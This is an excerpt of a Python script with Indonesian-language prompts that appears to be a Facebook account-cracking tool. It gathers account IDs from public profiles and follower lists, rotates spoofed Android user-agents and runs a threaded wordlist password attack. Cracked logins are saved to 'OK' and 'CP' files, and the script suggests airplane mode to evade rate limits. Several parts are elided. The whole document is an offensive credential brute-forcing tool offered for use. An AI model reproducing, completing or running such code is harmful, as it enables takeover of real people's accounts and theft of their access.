...
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A105F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]","Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/325.0.1.4.108;]","Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]","Mozilla/5.0 (Linux; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
...
99%     
           	{m}•{k}•{h}•{sir} Author : ROBET XD GANTENG {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	print('')
	print('>> 1. CRACK PUBLICK ')
	print('>> 2. CRACK FOLLOWER ')
	print('>> 3. CRACK GRUP   ')
	print('>> 4. CRACK FILE	')
	print('>> 5. HASIL CRACK  ')
	print('>> 0. KELUAR      ')
	_____dantod__real_____ = input('\n>> Pilih : ')
	if _____dantod__real_____ in ['1']:
		dump_massal()
	elif _____dantod__real_____ in ['2']:
		dump_follower()
	elif _____dantod__real_____ in ['3']:
		error()
	elif _____dantod__real_____ in ['4']:
		crack_file()
	elif _____dantod__real_____ in ['5']:
		result()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> BERAPA TARGET BROW? : '))
	except ValueError:
		print('>> MASUKAN ANGKA BANG BUKAN HURUF YA')
		exit()
	if jum<1 or jum>100:
	...
	for userr in uid:
		try:
			...
			print('>> SINYAL NOT RECOMMENDED')
			exit()
	try:
		print('')
		print(f'>> TOTAL IDZ YANG TERKUMPUL DARI ID😡{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> SINYAL LO TROBEL')
		back()
	except (KeyError,IOError):
...
def dump_pengikut():
	...
	pil = input('>> MASUKAN ID TARGEZ CRACK : ')
	try:
...
#		method.append('touch')
		...
		method.append('MOBILE')
	print('')
#	_jembot_ = input('>> TAMBAHKAN APLIKASIN YANG TERKAIT ( Y/t ) ')
#	if _jembot_ in ['']:
...
#	else:
#		taplikasi.append('no')
	pwplus=input('>> TAMBAHKAN PASWORD MANUAL ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} SEDANG CRACK MOHON TUNGU HINGA DAPAT🌊 {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'>> MAINKAN MODE PESAWAT KETIKA ID {m}1k{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] CRACK SELESAI JANGAN LUPA BERSYUKUR KALO CP NGAB[cyan] <<[white] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rR {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
